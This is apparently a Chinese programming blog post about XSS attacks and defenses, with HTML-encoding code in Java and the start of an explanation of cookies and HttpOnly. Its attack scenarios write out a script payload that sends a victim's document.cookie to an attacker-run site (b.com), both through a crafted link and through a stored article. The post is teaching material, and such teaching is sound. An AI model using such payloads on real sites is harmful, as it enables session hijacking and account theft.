

<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
XSS又称CSS，全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。</p>&#13;
<h1 style="margin:0px; padding:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; line-height:35px">&#13;
<a target="_blank" name="t0" style="color:rgb(12,137,207)" id="t0"></a>XSS攻击</h1>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       XSS攻击类似于SQL注入攻击，攻击之前，我们先找到一个存在XSS漏洞的网站，XSS漏洞分为两种，一种是DOM Based XSS漏洞，另一种是Stored XSS漏洞。理论上，<strong>所有可输入的地方</strong>没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。</p>&#13;
<h2 style="margin:0px; padding:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; line-height:35px">&#13;
<a target="_blank" name="t1" style="color:rgb(12,137,207)" id="t1"></a>DOM Based XSS</h2>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       DOM Based XSS是一种基于网页DOM结构的攻击，该攻击特点是中招的人是少数人。</p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       <strong>场景一</strong>：</p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它测页面处理可能是这样，其它语言类似： </p>&#13;
<table border="1" cellspacing="0" cellpadding="0" style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px; background:rgb(242,242,242)">&#13;
<tbody>&#13;
<tr>&#13;
<td valign="top">&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
<span style="color:rgb(191,95,63)">&lt;%@</span> <span style="color:rgb(63,127,127)">page</span> <span style="color:rgb(127,0,127)">language</span>=<em><span style="color:rgb(42,0,255)">"<a target="_blank" href="http://lib.csdn.net/base/17" class="replace_word" title="Java EE知识库" style="text-decoration:none; color:rgb(223,52,52); font-weight:bold">Java</a>"</span></em><span style="color:rgb(127,0,127)">contentType</span>=<em><span style="color:rgb(42,0,255)">"text/html;&#13;
 charset=UTF-8"</span></em><span style="color:rgb(127,0,127)">pageEncoding</span>=<em><span style="color:rgb(42,0,255)">"UTF-8"</span></em><span style="color:rgb(191,95,63)">%&gt;</span></p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
<span style="color:teal">&lt;!</span><span style="color:rgb(63,127,127)">DOCTYPE</span><span style="color:teal">html</span><span style="color:gray">PUBLIC</span><span style="color:teal">"-//W3C//DTD HTML 4.01 Transitional//EN"</span><span style="color:rgb(63,127,95)">"http://www.w3.org/TR/html4/loose.dtd"</span><span style="color:teal">&gt;</span></p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
<span style="color:teal">&lt;</span><span style="color:rgb(63,127,127)">html</span><span style="color:teal">&gt;</span></p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
    <span style="color:teal">&lt;</span><span style="color:rgb(63,127,127)">head</span><span style="color:teal">&gt;</span></p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
       <span style="color:teal">&lt;</span><span style="color:rgb(63,127,127)">title</span><span style="color:teal">&gt;</span>XSS测试<span style="color:teal">&lt;/</span><span style="color:rgb(63,127,127)">title</span><span style="color:teal">&gt;</span></p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
    <span style="color:teal">&lt;/</span><span style="color:rgb(63,127,127)">head</span><span style="color:teal">&gt;</span></p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
    <span style="color:teal">&lt;</span><span style="color:rgb(63,127,127)">body</span><span style="color:teal">&gt;</span></p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
       页面内容：<span style="color:rgb(191,95,63)">&lt;%=</span>request.getParameter(<span style="color:rgb(42,0,255)">"content"</span>)<span style="color:rgb(191,95,63)">%&gt;</span></p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
    <span style="color:teal">&lt;/</span><span style="color:rgb(63,127,127)">body</span><span style="color:teal">&gt;</span></p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
<span style="color:teal">&lt;/</span><span style="color:rgb(63,127,127)">html</span><span style="color:teal">&gt;</span></p>&#13;
</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">      我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：http://www.a.com?content=&lt;script&gt;window.open(“www.b.com?param=”+document.cookie)&lt;/script&gt;，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！这个过程中，受害者只有Tom自己。那当我在浏览器输入a.com?content=&lt;script&gt;alert(“xss”)&lt;/script&gt;，浏览器展示页面内容的过程中，就会执行我的脚本，页面输出xss字样，这是攻击了我自己，那我如何攻击别人并且获利呢？</span>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
</p>&#13;
<h2 style="margin:0px; padding:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; line-height:35px">&#13;
<a target="_blank" name="t2" style="color:rgb(12,137,207)" id="t2"></a>Stored XSS</h2>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       Stored XSS是存储式XSS漏洞，由于其攻击代码已经存储到服务器上或者<a target="_blank" href="http://lib.csdn.net/base/14" class="replace_word" title="MySQL知识库" style="text-decoration:none; color:rgb(223,52,52); font-weight:bold">数据库</a>中，所以受害者是很多人。</p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       <strong>场景二</strong>：</p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，&lt;script&gt;window.open(“www.b.com?param=”+document.cookie)&lt;/script&gt;，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。<br />&#13;
       Stored XSS漏洞危害性更大，危害面更广。</p>&#13;
<h1 style="margin:0px; padding:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; line-height:35px">&#13;
<a target="_blank" name="t3" style="color:rgb(12,137,207)" id="t3"></a>XSS防御</h1>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       我们是在一个矛盾的世界中，有矛就有盾。只要我们的代码中不存在漏洞，攻击者就无从下手，我们要做一个没有缝的蛋。XSS防御有如下方式。</p>&#13;
<h2 style="margin:0px; padding:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; line-height:35px">&#13;
<a target="_blank" name="t4" style="color:rgb(12,137,207)" id="t4"></a>完善的过滤体系</h2>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       永远不相信用户的输入。需要对用户的输入进行处理，只允许输入合法的值，其它值一概过滤掉。</p>&#13;
<h2 style="margin:0px; padding:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; line-height:35px">&#13;
<a target="_blank" name="t5" style="color:rgb(12,137,207)" id="t5"></a>Html encode</h2>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       假如某些情况下，我们不能对用户数据进行严格的过滤，那我们也需要对标签进行转换。</p>&#13;
<table border="1" cellspacing="0" cellpadding="0" width="675" style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px; background:rgb(242,249,255)">&#13;
<tbody>&#13;
<tr>&#13;
<td valign="top">&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
<span style="color:rgb(46,46,46)">less-than character (&lt;)</span></p>&#13;
</td>&#13;
<td valign="top">&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
<span style="color:rgb(46,46,46)">&amp;lt;</span></p>&#13;
</td>&#13;
</tr>&#13;
<tr>&#13;
<td valign="top">&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
<span style="color:rgb(46,46,46)">greater-than character (&gt;)</span></p>&#13;
</td>&#13;
<td valign="top">&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
<span style="color:rgb(46,46,46)">&amp;gt;</span></p>&#13;
</td>&#13;
</tr>&#13;
<tr>&#13;
<td valign="top">&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
<span style="color:rgb(46,46,46)">ampersand character (&amp;)</span></p>&#13;
</td>&#13;
<td valign="top">&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
<span style="color:rgb(46,46,46)">&amp;amp;</span></p>&#13;
</td>&#13;
</tr>&#13;
<tr>&#13;
<td valign="top">&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
<span style="color:rgb(46,46,46)">double-quote character (")</span></p>&#13;
</td>&#13;
<td valign="top">&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
<span style="color:rgb(46,46,46)">&amp;quot;</span></p>&#13;
</td>&#13;
</tr>&#13;
<tr>&#13;
<td valign="top">&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
<span style="color:rgb(46,46,46)">space character( )</span></p>&#13;
</td>&#13;
<td valign="top">&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
<span style="color:rgb(46,46,46)">&amp;nbsp;</span></p>&#13;
</td>&#13;
</tr>&#13;
<tr>&#13;
<td valign="top">&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
<span style="color:rgb(46,46,46)">Any ASCII code character whose code is greater-than or equal to 0x80</span></p>&#13;
</td>&#13;
<td valign="top">&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
<span style="color:rgb(46,46,46)">&amp;#&lt;number&gt;, where &lt;number&gt; is the ASCII character value.</span></p>&#13;
</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">      比如用户输入：&lt;script&gt;window.location.href=”http://www.baidu.com”;&lt;/script&gt;，保存后最终存储的会是：&amp;lt;script&amp;gt;window.location.href=&amp;quot;http://www.baidu.com&amp;quot;&amp;lt;/script&amp;gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。</span>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
</p>&#13;
<h1 style="margin:0px; padding:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; line-height:35px">&#13;
<a target="_blank" name="t6" style="color:rgb(12,137,207)" id="t6"></a>其它</h1>&#13;
<div style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       下面提供两种Html encode的方法。</div>&#13;
<div style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
<ul>&#13;
<li>使用Apache的commons-lang.jar&#13;
<table border="1" cellspacing="0" cellpadding="0">&#13;
<tbody>&#13;
<tr>&#13;
<td valign="top">&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
StringEscapeUtils.escapeHtml(str);// 汉字会转换成对应的ASCII码，空格不转换</p>&#13;
</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
</li></ul>&#13;
<ul>&#13;
<li>自己实现转换，只转换部分字符&#13;
<table border="1" cellspacing="0" cellpadding="0" style="background:rgb(242,242,242)">&#13;
<tbody>&#13;
<tr>&#13;
<td valign="top">&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
<strong><span style="color:rgb(127,0,85)">private</span> <span style="color:rgb(127,0,85)">static</span></strong> String htmlEncode(<strong><span style="color:rgb(127,0,85)">char</span></strong> c) {</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
    <strong><span style="color:rgb(127,0,85)">switch</span></strong>(c) {</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
       <strong><span style="color:rgb(127,0,85)">case</span></strong> <span style="color:rgb(42,0,255)">'&amp;'</span>:</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
           <strong><span style="color:rgb(127,0,85)">return</span></strong><span style="color:rgb(42,0,255)">"&amp;amp;"</span>;</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
       <strong><span style="color:rgb(127,0,85)">case</span></strong> <span style="color:rgb(42,0,255)">'&lt;'</span>:</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
           <strong><span style="color:rgb(127,0,85)">return</span></strong><span style="color:rgb(42,0,255)">"&amp;lt;"</span>;</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
       <strong><span style="color:rgb(127,0,85)">case</span></strong> <span style="color:rgb(42,0,255)">'&gt;'</span>:</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
           <strong><span style="color:rgb(127,0,85)">return</span></strong><span style="color:rgb(42,0,255)">"&amp;gt;"</span>;</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
       <strong><span style="color:rgb(127,0,85)">case</span></strong> <span style="color:rgb(42,0,255)">'"'</span>:</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
           <strong><span style="color:rgb(127,0,85)">return</span></strong><span style="color:rgb(42,0,255)">"&amp;quot;"</span>;</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
       <strong><span style="color:rgb(127,0,85)">case</span></strong> <span style="color:rgb(42,0,255)">' '</span>:</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
           <strong><span style="color:rgb(127,0,85)">return</span></strong><span style="color:rgb(42,0,255)">"&amp;nbsp;"</span>;</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
       <strong><span style="color:rgb(127,0,85)">default</span></strong>:</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
           <strong><span style="color:rgb(127,0,85)">return</span></strong> c +<span style="color:rgb(42,0,255)">""</span>;</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
    }</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
}</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
 </p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
<span style="color:rgb(63,95,191)">/** </span><span style="color:rgb(63,95,191)">对传入的字符串</span><u><span style="color:rgb(63,95,191)">str</span></u><span style="color:rgb(63,95,191)">进行</span><u><span style="color:rgb(63,95,191)">Html</span></u><span style="color:rgb(63,95,191)"> encode</span><span style="color:rgb(63,95,191)">转换</span><span style="color:rgb(63,95,191)"> */</span></p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
<strong><span style="color:rgb(127,0,85)">public</span> <span style="color:rgb(127,0,85)">static</span></strong> String htmlEncode(String str) {</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
    <strong><span style="color:rgb(127,0,85)">if</span></strong>(str ==<strong><span style="color:rgb(127,0,85)">null</span></strong> || str.trim().equals(<span style="color:rgb(42,0,255)">""</span>))   <strong><span style="color:rgb(127,0,85)">return</span></strong> str;</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
    StringBuilder encodeStrBuilder = <strong><span style="color:rgb(127,0,85)">new</span></strong> StringBuilder();</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
    <strong><span style="color:rgb(127,0,85)">for</span></strong> (<strong><span style="color:rgb(127,0,85)">int</span></strong> i = 0, len = str.length(); i &lt; len; i++) {</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
       encodeStrBuilder.append(<em>htmlEncode</em>(str.charAt(i)));</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
    }</p>&#13;
<p align="left" style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
    <strong><span style="color:rgb(127,0,85)">return</span></strong> encodeStrBuilder.toString();</p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px">&#13;
}</p>&#13;
</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
</li></ul>&#13;
       </div>&#13;
<h1 style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
Cookie深度解析、</h1>&#13;
<div>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
    最近在公司做了Web端单点登录(SSO)功能，基于Cookie实现，做完之后感觉有必要总结一下，本文着重讲解Cookie，下文会说明单点登录的实现方案。</p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
<strong>Cookie简介</strong></p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       众所周知，Web协议（也就是HTTP）是一个无状态的协议（HTTP1.0）。一个Web应用由很多个Web页面组成，每个页面都有唯一的URL来定义。用户在浏览器的地址栏输入页面的URL，浏览器就会向Web Server去发送请求。如下图，浏览器向Web服务器发送了两个请求，申请了两个页面。这两个页面的请求是分别使用了两个单独的HTTP连接。所谓无状态的协议也就是表现在这里，浏览器和Web服务器会在第一个请求完成以后关闭连接通道，在第二个请求的时候重新建立连接。Web服务器并不区分哪个请求来自哪个客户端，对所有的请求都一视同仁，都是单独的连接。这样的方式大大区别于传统的（Client/Server）C/S结构,在那样的应用中，客户端和服务器端会建立一个长时间的专用的连接通道。正是因为有了无状态的特性，每个连接资源能够很快被其他客户端所重用，一台Web服务器才能够同时服务于成千上万的客户端。<img src="http://img.blog.csdn.net/20140303202645515?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="" style="border:none; max-width:602px; height:auto" /><br />&#13;
       但是我们通常的应用是有状态的。先不用提不同应用之间的SSO，在同一个应用中也需要保存用户的登录身份信息。例如用户在访问页面1的时候进行了登录，但是刚才也提到，客户端的每个请求都是单独的连接，当客户再次访问页面2的时候，如何才能告诉Web服务器，客户刚才已经登录过了呢？浏览器和服务器之间有约定：通过使用cookie技术来维护应用的状态。Cookie是可以被Web服务器设置的字符串，并且可以保存在浏览器中。如下图所示，当浏览器访问了页面1时，web服务器设置了一个cookie，并将这个cookie和页面1一起返回给浏览器，浏览器接到cookie之后，就会保存起来，在它访问页面2的时候会把这个cookie也带上，Web服务器接到请求时也能读出cookie的值，根据cookie值的内容就可以判断和恢复一些用户的信息状态。<img src="http://img.blog.csdn.net/20140303203325796?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="" style="border:none; max-width:602px; height:auto" /><br />&#13;
</p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
<strong>Cookie组成</strong></p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
<strong>       </strong>cookie是由名称、内容、作用路径、作用域、<span style="font-size:12px">协议、</span>生存周期组成，另外还有个HttpOnly属性，HttpOnly属性很重要，如果您在cookie中设置了HttpOnly属性，那么通过js脚本(document.cookie)将无法读取到cookie信息，这样能一定程度上的防止XSS攻击，关于XSS可以看我之前的文章--<a target="_blank" href="http://blog.csdn.net/ghsau/article/details/17027893" style="text-decoration:none; color:rgb(12,137,207)">XSS攻击及防御</a>。Tomcat服务器设置的JSESSIONID就是HttpOnly的。<img src="http://img.blog.csdn.net/20140303213906046?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="" style="border:none; max-width:602px; height:auto" /><br />&#13;
       JavaEE中对cookie做了封装，对应的是下面这个类：</p>&#13;
<pre style="white-space:pre-wrap; word-wrap:break-word; color:rgb(85,85,85); font-size:15px; line-height:35px; background-color:rgb(255,255,255)">java.lang.Object
  |
  +--<strong>javax.servlet.http.Cookie</strong></pre>&#13;
<span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">       该类可以设置cookie的名称、内容、作用路径、作用域、协议、生存周期，but不能设置HttpOnly属性，不知道这么做是出于什么考虑，如果非要设置HttpOnly的cookie，我们可以通过响应头来处理：</span>&#13;
<div class="dp-highlighter bg_java" style="font-family:Consolas,'Courier New',Courier,mono,serif; width:938.516px; overflow:hidden; padding-top:1px; border-color:rgb(204,204,204); color:rgb(85,85,85); line-height:35px; margin:18px 0px!important; background-color:rgb(231,229,220)">&#13;
<div class="bar" style="padding-left:45px">&#13;
<div class="tools" style="padding:3px 8px 10px 10px; font-size:9px; line-height:normal; font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; color:silver; border-left-width:3px; border-left-style:solid; border-left-color:rgb(153,153,153); background-color:rgb(248,248,248)">&#13;
<strong>[java]</strong> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20395681" class="ViewSource" title="view plain" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">view&#13;
 plain</a><span> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20395681" class="CopyToClipboard" title="copy" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">copy</a></span>&#13;
<div style="position:absolute; left:474px; top:2262px; width:27px; height:15px; z-index:99">&#13;
</div>&#13;
<span> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20395681" class="PrintSource" title="print" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">print</a></span><a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20395681" class="About" title="?" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">?</a><span class="tracking-ad"><a target="_blank" href="https://code.csdn.net/snippets/216375" title="在CODE上查看代码片" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit"><img src="https://code.csdn.net/assets/CODE_ico.png" width="12" height="12" alt="在CODE上查看代码片" style="border:none; position:relative; top:1px; left:2px" /></a></span><span class="tracking-ad"><a target="_blank" href="https://code.csdn.net/snippets/216375/fork" title="派生到我的代码片" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit"><img src="https://code.csdn.net/assets/ico_fork.svg" width="12" height="12" alt="派生到我的代码片" style="border:none; position:relative; top:2px; left:2px" /></a></span></div>&#13;
</div>&#13;
<ol start="1" class="dp-j" style="padding:0px; border:none; color:rgb(92,92,92); margin:0px 0px 1px 45px!important; background-color:rgb(255,255,255)">&#13;
<li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit"><span style="margin:0px; padding:0px; border:none; background-color:inherit">response.setHeader(</span><span class="string" style="margin:0px; padding:0px; border:none; color:red; background-color:inherit">"Set-Cookie"</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">, </span><span class="string" style="margin:0px; padding:0px; border:none; color:red; background-color:inherit">"cookiename=value;Path=/;Domain=domainvalue;Max-Age=seconds;HttpOnly"</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">);  </span></span></li></ol>&#13;
</div>&#13;
<span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">Cookie作用域</span><br style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px" />&#13;
<span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">       测试Cookie的作用域需要弄几个域名，修改C:\Windows\System32\drivers\etc\hosts文件，将本机ip映射出四个域名，如下：</span>&#13;
<div class="dp-highlighter bg_html" style="font-family:Consolas,'Courier New',Courier,mono,serif; width:938.516px; overflow:hidden; padding-top:1px; border-color:rgb(204,204,204); color:rgb(85,85,85); line-height:35px; margin:18px 0px!important; background-color:rgb(231,229,220)">&#13;
<div class="bar" style="padding-left:45px">&#13;
<div class="tools" style="padding:3px 8px 10px 10px; font-size:9px; line-height:normal; font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; color:silver; border-left-width:3px; border-left-style:solid; border-left-color:rgb(153,153,153); background-color:rgb(248,248,248)">&#13;
<strong>[html]</strong> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20395681" class="ViewSource" title="view plain" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">view&#13;
 plain</a><span> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20395681" class="CopyToClipboard" title="copy" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">copy</a></span>&#13;
<div style="position:absolute; left:476px; top:2416px; width:27px; height:15px; z-index:99">&#13;
</div>&#13;
